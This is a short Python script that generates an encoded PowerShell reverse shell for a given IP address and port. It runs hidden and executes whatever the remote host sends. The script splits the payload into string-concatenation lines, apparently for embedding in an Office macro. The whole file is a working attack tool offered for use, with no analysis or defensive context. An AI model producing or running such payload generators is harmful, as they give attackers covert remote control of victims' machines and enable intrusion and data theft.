import sys
import base64


if len(sys.argv) <=2:
    print('Usage: ' + sys.argv[0] + ' <ip-addr> <port>')
else:
    ip = sys.argv[1]
    port = sys.argv[2]

    payload = '$client = New-Object System.Net.Sockets.TCPClient("'+ ip +'",' + port +');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

    n = 40

    for i in range(0, len(cmd), n):
        print("Str = Str + " + '"' + cmd[i:i+n] + '"')